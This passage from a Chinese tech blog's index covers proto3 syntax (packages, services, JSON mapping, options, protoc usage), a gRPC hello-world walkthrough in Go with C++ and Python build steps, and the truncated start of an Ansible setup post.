包\n\n您可以向`.proto`文件添加`package`可选说明符，以防止协议消息类型之间的名称冲突。\n\n```protobuf\npackage foo.bar;\nmessage Open { ... }\n```\n\n然后，您可以在定义消息类型的字段时使用包说明符：\n\n```protobuf\nmessage Foo {\n  ...\n  foo.bar.Open open = 1;\n  ...\n}\n```\n\n包说明符影响生成的代码的方式取决于您选择的语言：\n\n- 在**C ++中**，生成的类包含在C ++命名空间中。例如，`Open`将在命名空间中`foo::bar`。\n- 在**Java中**，该包用作Java包，除非您`option java_package`在`.proto`文件中明确提供了该包。\n- 在**Python中**，package指令被忽略，因为Python模块是根据它们在文件系统中的位置进行组织的。\n- 在**Go中**，该包用作Go包名称，除非您`option go_package`在`.proto`文件中明确提供。\n- 在**Ruby中**，生成的类包含在嵌套的Ruby命名空间内，转换为所需的Ruby大写形式（首字母大写;如果第一个字符不是字母，`PB_`则前置）。例如，`Open`将在命名空间中`Foo::Bar`。\n- 在**C＃中**，包转换为PascalCase后用作命名空间，除非您`option csharp_namespace`在`.proto`文件中明确提供。例如，`Open`将在命名空间中`Foo.Bar`。\n\n##### 12.1 包和名称解析\n\n协议缓冲区语言中的类型名称解析与C ++类似：首先搜索最里面的范围，然后搜索下一个范围，依此类推，每个包被认为是其父包的“内部”。一个领先的'。' （例如，`.foo.bar.Baz`）意味着从最外层的范围开始。\n\nprotobuf 编译器通过解析导入的`.proto`文件来解析所有类型名称。每种语言的代码生成器都知道如何使用该语言引用每种类型，即使它具有不同的范围规则。\n\n\n\n### 13. 定义服务\n\n如果要将消息类型与RPC（远程过程调用）系统一起使用，则可以在`.proto`文件中定义RPC服务接口，protobuf 编译器将使用您选择的语言生成服务接口代码和存根。因此，例如，如果要定义RPC服务请求方法为:`SearchRequest`和返回方法为:`SearchResponse`，可以`.proto`按如下方式在文件中定义它：\n\n```protobuf\nservice SearchService {\n  rpc Search（SearchRequest）returns（SearchResponse）;\n}\n```\n\n与协议缓冲区一起使用的最简单的RPC系统是[gRPC](https://link.juejin.im?target=https%3A%2F%2Fgrpc.io%2F)：一种由Google开发的，平台中立的开源RPC系统。gRPC特别适用于protobuf，并允许在您的`.proto`文件中使用特殊的protobuf 编译器插件直接生成相关的RPC代码。\n\n如果您不想使用gRPC，也可以将protobuf与您自己的RPC实现一起使用。您可以在[Proto2语言指南中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23services)找到更多相关信息。\n\n还有一些正在进行的第三方项目使用Protocol Buffers开发RPC实现。有关我们了解的项目的链接列表，请参阅[第三方加载项wiki页面](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fprotobuf%2Fblob%2Fmaster%2Fdocs%2Fthird_party.md)。\n\n\n\n### 14. JSON映射\n\nProto3支持JSON中的规范编码，使得在系统之间共享数据变得更加容易。在下表中逐个类型地描述编码。\n\n如果JSON编码数据中缺少值`null`，或者其值为，则在解析为协议缓冲区时，它将被解释为适当的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。如果字段在协议缓冲区中具有默认值，则默认情况下将在JSON编码数据中省略该字段以节省空间。实现可以提供用于在JSON编码的输出中发出具有默认值的字段的选项。\n\n| proto3                 | JSON          | JSON示例                                 | 笔记                                                         |\n| ---------------------- | ------------- | ---------------------------------------- | ------------------------------------------------------------ |\n| message                | object        | `{\"fooBar\": v, \"g\": null,…}`             | 生成JSON对象。消息字段名称映射到小写驼峰并成为JSON对象键。如果`json_name`指定了field选项，则指定的值将用作键。解析器接受小写驼峰名称（或`json_name`选项指定的名称）和原始proto字段名称。`null`是所有字段类型的可接受值，并将其视为相应字段类型的默认值。 |\n| eunm                   | String        | `\"FOO_BAR\"`                              | 使用proto中指定的枚举值的名称。解析器接受枚举名称和整数值。  |\n| map<K，V>              | object        | `{\"k\": v, …}`                            | 所有键都转换为字符串。                                       |\n| repeated V.            | array         | `[v, …]`                                 | `null` 被接受为空列表[]。                                    |\n| bool                   | true,false    | `true, false`                            |                                                              |\n| string                 | string        | `\"Hello World!\"`                         |                                                              |\n| bytes                  | base64 string | `\"YWJjMTIzIT8kKiYoKSctPUB+\"`             | JSON值将是使用带填充的标准base64编码编码为字符串的数据。接受带有/不带填充的标准或URL安全base64编码。 |\n| int32，fixed32，uint32 | string        | `1, -10, 0`                              | JSON值将是十进制数。接受数字或字符串。                       |\n| int64，fixed64，uint64 | string        | `\"1\", \"-10\"`                             | JSON值将是十进制字符串。接受数字或字符串。                   |\n| float,double           | number        | `1.1, -10.0, 0, \"NaN\",\"Infinity\"`        | JSON值将是一个数字或一个特殊字符串值“NaN”，“Infinity”和“-Infinity”。接受数字或字符串。指数表示法也被接受。 |\n| any                    | object        | `{\"@type\": \"url\", \"f\": v, … }`           | 如果Any包含具有特殊JSON映射的值，则将按如下方式进行转换：。否则，该值将转换为JSON对象，并将插入该字段以指示实际的数据类型。`{\"@type\": xxx, \"value\": yyy}``\"@type\"` |\n| Timestamp              | string        | `\"1972-01-01T10:00:20.021Z\"`             | 使用RFC 3339，其中生成的输出将始终被Z标准化并使用0,3,6或9个小数位。也接受“Z”以外的偏移。 |\n| Duration               | string        | `\"1.000340012s\", \"1s\"`                   | 生成的输出始终包含0,3,6或9个小数位，具体取决于所需的精度，后跟后缀“s”。接受的是任何小数位（也没有），只要它们符合纳秒精度并且后缀“s”是必需的。 |\n| Struct                 | `object`      | `{ … }`                                  | 任何JSON对象。见。`struct.proto`                             |\n| Wrapper types          | various types | `2, \"2\", \"foo\", true,\"true\", null, 0, …` | 包装器在JSON中使用与包装基元类型相同的表示形式，除了`null`在数据转换和传输期间允许和保留的表示形式。 |\n| FieldMask              | string        | `\"f.fooBar,h\"`                           | 见。`field_mask.proto`                                       |\n| ListValue              | array         | `[foo, bar, …]`                          |                                                              |\n| Value                  | value         |                                          | 任何JSON值                                                   |\n| NullValue              | null          |                                          | JSON null                                                    |\n\n##### 13.1 JSON选项\n\nproto3  JSON实现可以提供以下选项：\n\n- **使用默认值发出字段**：默认情况下，proto3 JSON输出中省略了**具有默认值的**字段。实现可以提供覆盖此行为的选项，并使用其默认值输出字段。\n- **忽略未知字段**：默认情况下，Proto3 JSON解析器应拒绝未知字段，但可以提供忽略解析中未知字段的选项。\n- **使用proto字段名称而不是小写驼峰名称**：默认情况下，proto3 JSON打印机应将字段名称转换为小写驼峰并将其用作JSON名称。实现可以提供使用proto字段名称作为JSON名称的选项。Proto3 JSON解析器需要接受转换后的小写驼峰名称和proto字段名称。\n- **将枚举值发送为整数而不是字符串**：默认情况下，在JSON输出中使用枚举值的名称。可以提供选项以使用枚举值的数值。\n\n### 14. 选项\n\n`.proto`文件中的各个声明可以使用许多*选项*进行注释。选项不会更改声明的整体含义，但可能会影响在特定上下文中处理它的方式。可用选项的完整列表在中定义`google/protobuf/descriptor.proto`。\n\n一些选项是文件级选项，这意味着它们应该在顶级范围内编写，而不是在任何消息，枚举或服务定义中。一些选项是消息级选项，这意味着它们应该写在消息定义中。一些选项是字段级选项，这意味着它们应该写在字段定义中。选项也可以写在枚举类型，枚举值，服务类型和服务方法上; 但是，目前没有任何有用的选择。\n\n以下是一些最常用的选项：\n\n- `java_package`（文件选项）：用于生成的Java类的包。如果`.proto`文件中没有给出显式选项`java_package`，则默认情况下将使用proto包（使用文件中的“package”关键字指定  .proto  ）。但是，proto包通常不能生成好的Java包，因为proto包不会以反向域名开头。如果不生成Java代码，则此选项无效。\n\n  ```protobuf\n  option java_package =“com.example.foo”;\n  ```\n  \n- `java_multiple_files` （文件选项）：导致在包级别定义顶级消息，枚举和服务，而不是在.proto文件之后命名的外部类中。\n\n```protobuf\noption java_multiple_files = true;\n```\n\n- `java_outer_classname`（file option）：要生成的最外层Java类（以及文件名）的类名。如果  `.proto`文件中没有指定 `java_outer_classname`，则通过将`.proto`文件名转换为驼峰格式（因此 `foo_bar.proto` 成为`FooBar.java`）来构造类名。如果不生成Java代码，则此选项无效。\n\n```protobuf\n  option java_outer_classname =“Ponycopter”;\n\n```\n\n- `optimize_for`\n\n  （文件选项）：可以设置为`SPEED`，`CODE_SIZE`或`LITE_RUNTIME`。这会以下列方式影响C ++和Java代码生成器（可能还有第三方生成器）：\n\n  - `SPEED`（默认值）：protobuf 编译器将生成用于对消息类型进行序列化，解析和执行其他常见操作的代码。此代码经过高度优化。\n  - `CODE_SIZE`：protobuf 编译器将生成最少的类，并依赖于基于反射的共享代码来实现序列化，解析和各种其他操作。因此生成的代码比使用`SPEED`小得多，但操作会更慢。类仍将实现与`SPEED`模式完全相同的公共API 。此模式在包含非常大数量的`.proto`文件的应用程序中最有用，并且不需要所有文件都非常快速。\n  - `LITE_RUNTIME`：protobuf 编译器将生成仅依赖于“lite”运行时库（`libprotobuf-lite`而不是`libprotobuf`）的类。精简版运行时比整个库小得多（大约小一个数量级），但省略了描述符和反射等特定功能。这对于在移动电话等受限平台上运行的应用程序尤其有用。编译器仍然会像在`SPEED`模式中一样生成所有方法的快速实现。生成的类将仅实现`MessageLite`每种语言的接口，该接口仅提供完整`Message`接口的方法的子集。\n\n  ```protobuf\n  option optimize_for = CODE_SIZE;\n  ```\n  \n- `cc_enable_arenas`（文件选项）：为C ++生成的代码启用[竞技场分配](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Farenas)。\n\n- `objc_class_prefix`（文件选项）：设置Objective-C类前缀，该前缀预先添加到此.proto的所有Objective-C生成的类和枚举中。没有默认值。您应该使用[Apple建议的](https://link.juejin.im?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fios%2Fdocumentation%2FCocoa%2FConceptual%2FProgrammingWithObjectiveC%2FConventions%2FConventions.html%23%2F%2Fapple_ref%2Fdoc%2Fuid%2FTP40011210-CH10-SW4) 3-5个大写字符之间的前缀。请注意，Apple保留所有2个字母的前缀。\n\n- `deprecated`（字段选项）：如果设置为`true`，则表示该字段已弃用，新代码不应使用该字段。在大多数语言中，这没有实际效果。在Java中，这成为一个`@Deprecated`注释。将来，其他特定于语言的代码生成器可能会在字段的访问器上生成弃用注释，这将导致在编译尝试使用该字段的代码时发出警告。如果任何人都没有使用该字段，并且您希望阻止新用户使用该字段，请考虑使用保留语句替换字段声明。\n\n  ```protobuf\n  int32 old_field = 6 [deprecated = true];\n  ```\n\n##### 14.1 自定义选项\n\nProtocol Buffers还允许您定义和使用自己的选项。这是大多数人不需要的**高级功能**。如果您确实认为需要创建自己的选项，请参阅[Proto2语言指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23customoptions)以获取详细信息。请注意，创建自定义选项使用的[扩展名](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23extensions)仅允许用于proto3中的自定义选项。\n\n### 15. 生成您的类\n\n根据实际工作需要，生成以下对应语言的自定义消息类型Java，Python，C ++，Go, Ruby, Objective-C，或C＃的`.proto`文件，你需要运行protobuf 编译器`protoc`上`.proto`。如果尚未安装编译器，请[下载该软件包](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fdownloads.html)并按照自述文件中的说明进行操作。对于Go，您还需要为编译器安装一个特殊的代码生成器插件：您可以在GitHub上的[golang / protobuf](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fprotobuf%2F)存储库中找到这个和安装说明。\n\nProtobuf 编译器的调用如下：\n\n```protobuf\nprotoc --proto_path = IMPORT_PATH --cpp_out = DST_DIR --java_out = DST_DIR --python_out = DST_DIR --go_out = DST_DIR --ruby_out = DST_DIR --objc_out = DST_DIR --csharp_out = DST_DIR  path / to / file .proto\n```\n\n- `IMPORT_PATH`指定`.proto`解析`import`指令时在其中查找文件的目录。如果省略，则使用当前目录。可以通过`--proto_path`多次传递选项来指定多个导入目录; 他们将按顺序搜索。 可以用作简短的形式。 `-I=*IMPORT_PATH*``--proto_path`\n\n- 您可以提供一个或多个输出指令：\n\n  - `--cpp_out`生成C ++代码`DST_DIR`。有关更多信息，请参阅[C ++生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcpp-generated)。\n  - `--java_out`生成Java代码`DST_DIR`。请参阅[的Java生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fjava-generated)更多。\n  - `--python_out`生成Python代码`DST_DIR`。看到[的Python生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fpython-generated)更多。\n  - `--go_out`生成Go代码`DST_DIR`。有关更多信息，请参阅[Go生成代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fgo-generated)。\n  - `--ruby_out`生成Ruby代码`DST_DIR`。Ruby生成的代码参考即将推出！\n  - `--objc_out`生成Objective-C代码`DST_DIR`。有关更多信息，请参阅[Objective-C生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fobjective-c-generated)。\n  - `--csharp_out`生成C＃代码`DST_DIR`。有关更多信息，请参阅[C＃生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcsharp-generated)。\n  - `--php_out`生成PHP代码`DST_DIR`。看到[PHP生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fphp-generated)更多。\n\n  为了方便起见，如果DST_DIR结束于`.zip`或.`jar`，编译器会将输出写入具有给定名称的单个ZIP格式存档文件。`.jar`输出还将根据Java JAR规范的要求提供清单文件。请注意，如果输出存档已存在，则会被覆盖; 编译器不够智能，无法将文件添加到现有存档中。\n\n- 您必须提供一个或多个`.proto`文件作为输入。`.proto`可以一次指定多个文件。虽然文件是相对于当前目录命名的，但每个文件必须位于其中一个文件中，`IMPORT_PATH`以便编译器可以确定其规范名称。\n\n\n\n### 参考资料:\n\n+ https://juejin.im/post/5bb597c2e51d450e6e03e42d\n+ https://colobu.com/2017/03/16/Protobuf3-language-guide/","tags":["protobuf"],"categories":["计算机基础"]},{"title":"grpc在golang_cpp_python下的实践","url":"%2Fp%2Fc0435795.html","content":"\n\n\n### 1. 下载protocbuf 生成器\n\nhttps://github.com/protocolbuffers/protobuf/releases\n\n例如我下载的是 [protoc-3.9.0-osx-x86_64.zip](https://github.com/protocolbuffers/protobuf/releases/download/v3.9.0/protoc-3.9.0-osx-x86_64.zip)\n\n```bash\ncd protoc-3.9.0-osx-x86_64 \ncp -r include/ /usr/local/include/ \ncp -r bin/ /usr/local/bin/\nprotoc --version\n```\n\n<!-- more -->\n\n### 2. golang版本\n\n```bash\ngo get -u google.golang.org/grpc\ngo get -u github.com/golang/protobuf/protoc-gen-go\n```\n\n我们去 `$GOPATH/src/google.golang.org/grpc/examples` 看helloworld例子\n\n```bash\ncd $GOPATH/src/google.golang.org/grpc/examples/helloworld\n```\n\n\n\n>  helloworld.proto\n\n```protobuf\nsyntax = \"proto3\";\n\noption java_multiple_files = true;\noption java_package = \"io.grpc.examples.helloworld\";\noption java_outer_classname = \"HelloWorldProto\";\n\npackage helloworld;\n\n// The greeting service definition.\nservice Greeter {\n  // Sends a greeting\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\n// The request message containing the user's name.\nmessage HelloRequest {\n  string name = 1;\n}\n\n// The response message containing the greetings\nmessage HelloReply {\n  string message = 1;\n}\n```\n\n我们通过.proto文件生成golang文件, 生成后的文件不要编辑.\n\n```sh\nprotoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld\n\n# 获取进入到helloworld目录里\nprotoc helloworld.proto --go_out=plugins=grpc:. \n```\n\n\n\n> helloworld.pb.go\n\n```go\n// Code generated by protoc-gen-go. DO NOT EDIT.\n// source: helloworld.proto\n\npackage helloworld\n\nimport (\n\tcontext \"context\"\n\tfmt \"fmt\"\n\tproto \"github.com/golang/protobuf/proto\"\n\tgrpc \"google.golang.org/grpc\"\n\tcodes \"google.golang.org/grpc/codes\"\n\tstatus \"google.golang.org/grpc/status\"\n\tmath \"math\"\n)\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ = proto.Marshal\nvar _ = fmt.Errorf\nvar _ = math.Inf\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the proto package it is being compiled against.\n// A compilation error at this line likely means your copy of the\n// proto package needs to be updated.\nconst _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package\n\n// The request message containing the user's name.\ntype HelloRequest struct {\n\tName                 string   `protobuf:\"bytes,1,opt,name=name,proto3\" json:\"name,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloRequest) Reset()         { *m = HelloRequest{} }\nfunc (m *HelloRequest) String() string { return proto.CompactTextString(m) }\nfunc (*HelloRequest) ProtoMessage()    {}\nfunc (*HelloRequest) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{0}\n}\n\nfunc (m *HelloRequest) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloRequest.Unmarshal(m, b)\n}\nfunc (m *HelloRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloRequest.Marshal(b, m, deterministic)\n}\nfunc (m *HelloRequest) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloRequest.Merge(m, src)\n}\nfunc (m *HelloRequest) XXX_Size() int {\n\treturn xxx_messageInfo_HelloRequest.Size(m)\n}\nfunc (m *HelloRequest) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloRequest.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloRequest proto.InternalMessageInfo\n\nfunc (m *HelloRequest) GetName() string {\n\tif m != nil {\n\t\treturn m.Name\n\t}\n\treturn \"\"\n}\n\n// The response message containing the greetings\ntype HelloReply struct {\n\tMessage              string   `protobuf:\"bytes,1,opt,name=message,proto3\" json:\"message,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloReply) Reset()         { *m = HelloReply{} }\nfunc (m *HelloReply) String() string { return proto.CompactTextString(m) }\nfunc (*HelloReply) ProtoMessage()    {}\nfunc (*HelloReply) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{1}\n}\n\nfunc (m *HelloReply) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloReply.Unmarshal(m, b)\n}\nfunc (m *HelloReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloReply.Marshal(b, m, deterministic)\n}\nfunc (m *HelloReply) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloReply.Merge(m, src)\n}\nfunc (m *HelloReply) XXX_Size() int {\n\treturn xxx_messageInfo_HelloReply.Size(m)\n}\nfunc (m *HelloReply) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloReply.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloReply proto.InternalMessageInfo\n\nfunc (m *HelloReply) GetMessage() string {\n\tif m != nil {\n\t\treturn m.Message\n\t}\n\treturn \"\"\n}\n\nfunc init() {\n\tproto.RegisterType((*HelloRequest)(nil), \"helloworld.HelloRequest\")\n\tproto.RegisterType((*HelloReply)(nil), \"helloworld.HelloReply\")\n}\n\nfunc init() { proto.RegisterFile(\"helloworld.proto\", fileDescriptor_17b8c58d586b62f2) }\n\nvar fileDescriptor_17b8c58d586b62f2 = []byte{\n\t// 175 bytes of a gzipped FileDescriptorProto\n\t0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0xe2, 0x12, 0xc8, 0x48, 0xcd, 0xc9,\n\t0xc9, 0x2f, 0xcf, 0x2f, 0xca, 0x49, 0xd1, 0x2b, 0x28, 0xca, 0x2f, 0xc9, 0x17, 0xe2, 0x42, 0x88,\n\t0x28, 0x29, 0x71, 0xf1, 0x78, 0x80, 0x78, 0x41, 0xa9, 0x85, 0xa5, 0xa9, 0xc5, 0x25, 0x42, 0x42,\n\t0x5c, 0x2c, 0x79, 0x89, 0xb9, 0xa9, 0x12, 0x8c, 0x0a, 0x8c, 0x1a, 0x9c, 0x41, 0x60, 0xb6, 0x92,\n\t0x1a, 0x17, 0x17, 0x54, 0x4d, 0x41, 0x4e, 0xa5, 0x90, 0x04, 0x17, 0x7b, 0x6e, 0x6a, 0x71, 0x71,\n\t0x62, 0x3a, 0x4c, 0x11, 0x8c, 0x6b, 0xe4, 0xc9, 0xc5, 0xee, 0x5e, 0x94, 0x9a, 0x5a, 0x92, 0x5a,\n\t0x24, 0x64, 0xc7, 0xc5, 0x11, 0x9c, 0x58, 0x09, 0xd6, 0x25, 0x24, 0xa1, 0x87, 0xe4, 0x02, 0x64,\n\t0xcb, 0xa4, 0xc4, 0xb0, 0xc8, 0x14, 0xe4, 0x54, 0x2a, 0x31, 0x38, 0x19, 0x70, 0x49, 0x67, 0xe6,\n\t0xeb, 0xa5, 0x17, 0x15, 0x24, 0xeb, 0xa5, 0x56, 0x24, 0xe6, 0x16, 0xe4, 0xa4, 0x16, 0x23, 0xa9,\n\t0x75, 0xe2, 0x07, 0x2b, 0x0e, 0x07, 0xb1, 0x03, 0x40, 0x5e, 0x0a, 0x60, 0x4c, 0x62, 0x03, 0xfb,\n\t0xcd, 0x18, 0x10, 0x00, 0x00, 0xff, 0xff, 0x0f, 0xb7, 0xcd, 0xf2, 0xef, 0x00, 0x00, 0x00,\n}\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ context.Context\nvar _ grpc.ClientConn\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the grpc package it is being compiled against.\nconst _ = grpc.SupportPackageIsVersion4\n\n// GreeterClient is the client API for Greeter service.\n//\n// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.\ntype GreeterClient interface {\n\t// Sends a greeting\n\tSayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error)\n}\n\ntype greeterClient struct {\n\tcc *grpc.ClientConn\n}\n\nfunc NewGreeterClient(cc *grpc.ClientConn) GreeterClient {\n\treturn &greeterClient{cc}\n}\n\nfunc (c *greeterClient) SayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error) {\n\tout := new(HelloReply)\n\terr := c.cc.Invoke(ctx, \"/helloworld.Greeter/SayHello\", in, out, opts...)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn out, nil\n}\n\n// GreeterServer is the server API for Greeter service.\ntype GreeterServer interface {\n\t// Sends a greeting\n\tSayHello(context.Context, *HelloRequest) (*HelloReply, error)\n}\n\n// UnimplementedGreeterServer can be embedded to have forward compatible implementations.\ntype UnimplementedGreeterServer struct {\n}\n\nfunc (*UnimplementedGreeterServer) SayHello(ctx context.Context, req *HelloRequest) (*HelloReply, error) {\n\treturn nil, status.Errorf(codes.Unimplemented, \"method SayHello not implemented\")\n}\n\nfunc RegisterGreeterServer(s *grpc.Server, srv GreeterServer) {\n\ts.RegisterService(&_Greeter_serviceDesc, srv)\n}\n\nfunc _Greeter_SayHello_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {\n\tin := new(HelloRequest)\n\tif err := dec(in); err != nil {\n\t\treturn nil, err\n\t}\n\tif interceptor == nil {\n\t\treturn srv.(GreeterServer).SayHello(ctx, in)\n\t}\n\tinfo := &grpc.UnaryServerInfo{\n\t\tServer:     srv,\n\t\tFullMethod: \"/helloworld.Greeter/SayHello\",\n\t}\n\thandler := func(ctx context.Context, req interface{}) (interface{}, error) {\n\t\treturn srv.(GreeterServer).SayHello(ctx, req.(*HelloRequest))\n\t}\n\treturn interceptor(ctx, in, info, handler)\n}\n\nvar _Greeter_serviceDesc = grpc.ServiceDesc{\n\tServiceName: \"helloworld.Greeter\",\n\tHandlerType: (*GreeterServer)(nil),\n\tMethods: []grpc.MethodDesc{\n\t\t{\n\t\t\tMethodName: \"SayHello\",\n\t\t\tHandler:    _Greeter_SayHello_Handler,\n\t\t},\n\t},\n\tStreams:  []grpc.StreamDesc{},\n\tMetadata: \"helloworld.proto\",\n}\n\n```\n\n\n\n我们看下`greeter_server` 的代码并且启动: `go run greeter_server/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\tport = \":50051\"\n)\n\n// server is used to implement helloworld.GreeterServer.\ntype server struct{}\n\n// SayHello implements helloworld.GreeterServer\nfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n\tlog.Printf(\"Received: %v\", in.Name)\n\treturn &pb.HelloReply{Message: \"Hello \" + in.Name}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", port)\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}\n```\n\n\n\n我们看下`greeter_client`的代码并且启动:` go run greeter_client/main.go`\n\n\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\taddress     = \"localhost:50051\"\n\tdefaultName = \"world\"\n)\n\nfunc main() {\n\t// Set up a connection to the server.\n\tconn, err := grpc.Dial(address, grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewGreeterClient(conn)\n\n\t// Contact the server and print out its response.\n\tname := defaultName\n\tif len(os.Args) > 1 {\n\t\tname = os.Args[1]\n\t}\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\tr, err := c.SayHello(ctx, &pb.HelloRequest{Name: name})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not greet: %v\", err)\n\t}\n\tlog.Printf(\"Greeting: %s\", r.Message)\n}\n```\n\n\n\nIf things go smoothly, you will see the `Greeting: Hello world` in the client side output.\n\nCongratulations! You’ve just run a client-server application with gRPC.\n\n\n\n##### 2.1 修改proto步骤总结\n\n+ 在proto文件里增加 `rpc SayHelloAgain (HelloRequest) returns (HelloReply) {}`的定义\n\n+ 通过protoc重新生成golang文件, 里面增加了SayHelloAgain相关方法\n\n+ 修改server文件增加方法来实现接口\n\n  ```go\n  func (s *server) SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n          return &pb.HelloReply{Message: \"Hello again \" + in.Name}, nil\n  }\n  ```\n\n+ 修改client方法增加调用\n\n  ```go\n  r, err = c.SayHelloAgain(ctx, &pb.HelloRequest{Name: name})\n  if err != nil {\n          log.Fatalf(\"could not greet: %v\", err)\n  }\n  log.Printf(\"Greeting: %s\", r.Message)\n  ```\n\n+ 总结\n  \n  + client调用的的`SayHelloAgain`是`helloworld.pb.go`里生成的方法\n  + server增加的方法是为了实现了`helloworld.pb.go` 生成的server新接口, 来实现callback\n\n\n\n### 3. TODO: cpp 版本\n\n参考: https://github.com/grpc/grpc/blob/master/BUILDING.md\n\n```bash\n# 安装xcode command line tools\nsudo xcode-select --install\n# 先安装必备的软件\nbrew install autoconf automake libtool shtool gflags\n\n# 下载官方代码并更新依赖\ngit clone https://github.com/grpc/grpc\ngit submodule update --init\n\n# 编译并且安装\nLIBTOOL=glibtool LIBTOOLIZE=glibtoolize make\nsudo make install\n```\n\n\n\n我们先进入hellworld例子\n\n```bash\ncd examples/cpp/hellworld/\nmake\n\n# make过程中可以看到会先生成helloworld.pb.cc\nprotoc -I ../../protos --cpp_out=. ../../protos/helloworld.proto\n```\n\n\n\n还可以这样生成:\n\n```bash\nprotoc --cpp_out=. helloworld.proto\nprotoc --grpc_out=. --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` helloworld.proto\n```\n\n\n\n### 4. TODO: python版本\n\n```bash\nsudo python3 -m pip install grpcio\nsudo python3 -m pip install grpcio-tools\npython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. helloworld.proto\n```\n\n\n\n\n\n### 5. 参考资料:\n\n- https://grpc.io/docs/quickstart/","tags":["grpc"],"categories":["golang"]},{"title":"ansible实践","url":"%2Fp%2F18605da6.html","content":"\n\n\n### 1. ansible 安装\n\n在 ansible 的世界里，我们会通过 inventory 档案来定义有哪些 managed node (被控端)，并借由 ssh 和 python 进行沟通。换句话说，当 control machine (主控端) 可以用 ssh 连上 managed node，且被连上的机器里有预载 python 时，ansile 就可以运作了.\n\n+ 控制端\n\n```bash\nsudo apt install ansible #linux\nbrew install ansible # mac\n```\n\n+ 